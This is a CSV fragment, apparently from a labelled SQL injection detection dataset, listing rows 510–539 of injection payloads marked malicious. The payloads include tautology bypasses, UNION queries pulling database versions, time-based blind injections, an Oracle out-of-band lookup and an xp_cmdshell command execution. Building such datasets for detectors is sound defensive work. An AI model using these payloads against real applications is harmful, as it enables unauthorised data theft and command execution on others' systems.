row_index,payload_norm,label,sqli_type_hint
510,or userid like '%,1,
511,"union ( select NULL, NULL, ( select @@version ) ) --",1,
512,select * from users where id = 1 or $<\ or 1 = 1 -- 1,1,
513,"admin""/*",1,
514,"select * from users where id = 1. union select 1,version ( ) -- 1",1,
515,) ;waitfor delay '0:0:__TIME__'--,1,
516,"select * from users where id = 1 union select @<@.,version ( ) -- 1",1,
517,"select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1,
518,"admin"" or ""1"" = ""1",1,
519,union ( select @@version ) --,1,
520,or ''^',1,
521,""" ) ) or sleep ( __TIME__ ) = """,1,
522,"union ( select NULL, NULL, NULL, NULL, NULL, ( select @@version ) ) --",1,
523,"select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",1,
524,"select * from users where id = 1 union select @ _,version ( ) -- 1",1,
525,select * from users where id = 1 + ( $+ ) or 1 = 1 -- 1,1,
526,select * from users where id = '1' <@$_ or 1 = 1 -- 1',1,
527,"select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1,
528,"select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1,
529,"""hi"""" ) or ( """"a"""" = """"a""",1,
530,select name from syscolumns where id = ( sele ...,1,
531,"select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1,
532,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 5 ) waitfor delay '0:0:2' --",1,
533,"select * from users where id = '1' + @<@# union select 1,version ( ) -- 1'",1,
534,union all select @@version--,1,
535,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1,
536,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,
537,""" or isNULL ( 1/0 ) /*",1,
538,"select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1,
539,"select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1,
